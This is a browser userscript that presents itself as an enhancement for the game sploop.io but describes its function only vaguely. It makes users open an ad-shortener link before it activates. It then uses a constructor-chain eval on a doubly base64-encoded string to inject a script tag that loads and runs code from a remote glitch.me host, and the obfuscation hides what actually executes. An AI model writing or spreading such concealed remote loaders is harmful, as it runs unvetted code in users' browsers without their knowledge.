// ==UserScript==
// @name         Better Sploop Script
// @namespace    http://tampermonkey.net/
// @version      1.1.1
// @description  Does some things, see them in the game!
// @author       Mini Scripter
// @match        http*://sploop.io/*
// @grant        none
// @license      GNU GPLv3
/* jshint esversion:6 */
// ==/UserScript==
var CurrentUrlParams = new URL(window.location.href).searchParams;
if (CurrentUrlParams.get(atob('c2hvd2VkQWRz')) != atob('RGlkU2VlQWRz')) {
alert('To use the script you have to skip an ad, to get redirected to the ad press f1 \nFor more information on how to skip press F2');
document.addEventListener('keydown', function(e){
  if (e.key == 'F1') {
    window.open('https://suaurl.com/ed1f18');
  }
  if (e.key == 'F2') {
    window.open('https://github.com/mini-programmer/Better-Sploop-Script/blob/main/How%20to%20skip%20the%20ad.md');
  }
});
}
if (CurrentUrlParams.get(atob('c2hvd2VkQWRz')) == atob('RGlkU2VlQWRz')) {
let a='constructor'; //Stolen from one of FZ Broadcasts's scripts, he is better than me in coding anyway :c
a[a][a](atob('bGV0IGVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTtlbGVtZW50LnNyYyA9IGF0b2IoJ2FIUjBjSE02THk5elkzSnBjSFJsY2kxamIyUmxjeTVuYkdsMFkyZ3ViV1V2UVhWMGIxVndaR0YwWlZOd2JHOXZjRlJvYVc1bmN5NXFjdz09Jyk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChlbGVtZW50KQo='))();
}
